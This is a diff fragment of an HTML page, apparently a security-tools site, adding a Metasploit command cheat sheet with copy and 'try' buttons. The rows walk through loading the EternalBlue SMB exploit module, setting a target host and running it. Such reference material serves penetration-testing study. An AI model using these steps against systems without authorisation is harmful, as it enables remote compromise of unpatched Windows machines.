+                                    <tr><td><code>use module</code></td><td>Select a module</td><td><code>use exploit/windows/smb/ms17_010_eternalblue</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="use exploit/windows/smb/ms17_010_eternalblue">COPY</button><button class="cyber-btn small try-btn" data-cmd="use exploit/windows/smb/ms17_010_eternalblue">TRY</button></td></tr>
+                                    <tr><td><code>show options</code></td><td>Display module options</td><td><code>show options</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="show options">COPY</button><button class="cyber-btn small try-btn" data-cmd="show options">TRY</button></td></tr>
+                                    <tr><td><code>set option value</code></td><td>Set module option</td><td><code>set RHOSTS 192.168.1.1</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="set RHOSTS 192.168.1.1">COPY</button><button class="cyber-btn small try-btn" data-cmd="set RHOSTS 192.168.1.1">TRY</button></td></tr>
+                                    <tr><td><code>exploit</code></td><td>Execute the module</td><td><code>exploit</code></td><td class="actions"><button class="cyber-btn small copy-btn" data-copy="exploit">COPY</button><button class="cyber-btn small try-btn" data-cmd="exploit">TRY</button></td></tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
                 </div>
 
                 <!-- Temp Email Tool -->
